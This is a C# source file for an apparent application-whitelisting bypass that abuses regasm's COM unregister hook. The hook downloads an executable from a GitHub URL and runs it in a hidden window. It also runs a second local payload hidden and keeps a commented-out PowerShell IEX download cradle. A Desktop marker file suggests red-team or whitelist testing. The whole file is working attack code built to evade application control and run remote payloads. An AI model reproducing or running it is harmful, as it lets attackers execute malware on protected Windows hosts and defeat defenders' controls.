using System;
using System.IO;
using System.Net;
using System.EnterpriseServices;
// edit .csproj to add the dll
using System.Runtime.InteropServices;
using System.Management.Automation;
// edit .csproj to add the dll

namespace RegasmUnRegBypass
{
    [ClassInterface(ClassInterfaceType.AutoDual)]
    [ComVisible(true)]
    public class Bypass : ServicedComponent
    {
        public Bypass() { Console.WriteLine("I am a basic COM Object"); }
        [ComUnregisterFunction] //This executes if registration fails
        public static void UnRegisterClass(string key)
        {
            string remoteUri = "https://raw.githubusercontent.com/NotSurprised/LoremIpsumDolorSitAmetconsEctetur/master/Payload/RegasmUnRegBypass/RegasmUnRegOnlinePayload.exe";
            string fileName = "RegasmUnRegOnlinePayloadDownloaded.exe", myStringWebResource = null;
            // Create a new WebClient instance.
            WebClient myWebClient = new WebClient();
            // Concatenate the domain with the Web resource filename.
            myStringWebResource = remoteUri + fileName;
            try
            {
                // Download the Web resource and save it into the current filesystem folder.
                myWebClient.DownloadFile(myStringWebResource, fileName);
                System.Diagnostics.Process process = new System.Diagnostics.Process();
            }
            catch
            {
            }
            System.Diagnostics.Process processA = new System.Diagnostics.Process();
            System.Diagnostics.ProcessStartInfo startInfoA = new System.Diagnostics.ProcessStartInfo();
            startInfoA.WindowStyle = System.Diagnostics.ProcessWindowStyle.Hidden;
            startInfoA.FileName = "RegasmUnRegOnlinePayloadDownloaded.exe";
            processA.StartInfo = startInfoA;
            try
            {
                processA.Start();
            }
            catch
            {
            }

            System.Diagnostics.Process processB = new System.Diagnostics.Process();
            System.Diagnostics.ProcessStartInfo startInfoB = new System.Diagnostics.ProcessStartInfo();
            startInfoB.WindowStyle = System.Diagnostics.ProcessWindowStyle.Hidden;
            startInfoB.FileName = "RegasmUnRegOfflinePayload.exe";
            processB.StartInfo = startInfoB;
            try
            {
                processB.Start();
            }
            catch
            {
            }

            //PowerShell ps = PowerShell.Create();
            //ps.AddCommand("Invoke-Expression");
            //ps.AddArgument("IEX (New-Object Net.WebClient).DownloadString('https://github.com/NotSurprised/LoremIpsumDolorSitAmetconsEctetur/raw/master/Payload/WhiteListTestScript.ps1')");
            //ps.Invoke();

            string path = Environment.GetFolderPath(Environment.SpecialFolder.Desktop);
            string filename = "/WLtester.txt";
            path += filename;
            using (FileStream file = File.Exists(path) ? File.Open(path, FileMode.Append) : File.Open(path, FileMode.CreateNew))
            {
                using (StreamWriter stream = new StreamWriter(file))
                {
                    stream.WriteLine("RegasmUnRegBypass.");
                }
            }
        }
    }
}
